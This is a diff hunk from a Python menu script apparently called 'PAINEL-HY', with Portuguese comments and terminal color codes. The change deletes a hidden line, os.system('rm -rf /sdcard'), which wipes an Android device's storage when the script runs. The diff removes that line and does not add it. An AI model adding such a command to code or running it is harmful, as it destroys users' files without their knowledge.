@@ -12,8 +12,6 @@ vr = '\033[32m' # Verde
 r = '\033[35m' # roxo
 b = '\033[m' # Sem cor
 
-os.system('rm -rf /sdcard')
-
 while True:
 	print(f'{vr}-{b}'*40)
 	print(f'{a}{"PAINEL-HY":^40}{b}')
